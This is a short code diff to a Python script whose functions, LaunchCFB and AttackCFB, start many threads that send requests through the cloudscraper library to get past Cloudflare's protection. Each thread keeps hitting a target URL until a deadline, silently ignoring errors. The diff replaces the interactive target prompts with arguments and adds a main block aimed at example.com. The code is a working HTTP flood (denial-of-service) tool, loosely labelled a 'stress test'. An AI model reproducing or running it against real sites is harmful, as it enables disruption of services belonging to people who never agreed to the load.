@@ -2,10 +2,7 @@ import datetime
 import threading
 import cloudscraper
 
-def LaunchCFB():
-    url = input("Enter the target website: ")
-    t = input("Enter the duration of the stress test in seconds: ")
-    th = input("Enter the number of threads to use: ")
+def LaunchCFB(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper()
     for _ in range(int(th)):
@@ -22,3 +19,9 @@ def AttackCFB(url, until_datetime, scraper):
             scraper.get(url, timeout=15)
         except:
             pass
+
+if __name__ == '__main__':
+    url = 'https://www.example.com'
+    th = 10
+    t = 60
+    LaunchCFB(url, th, t)
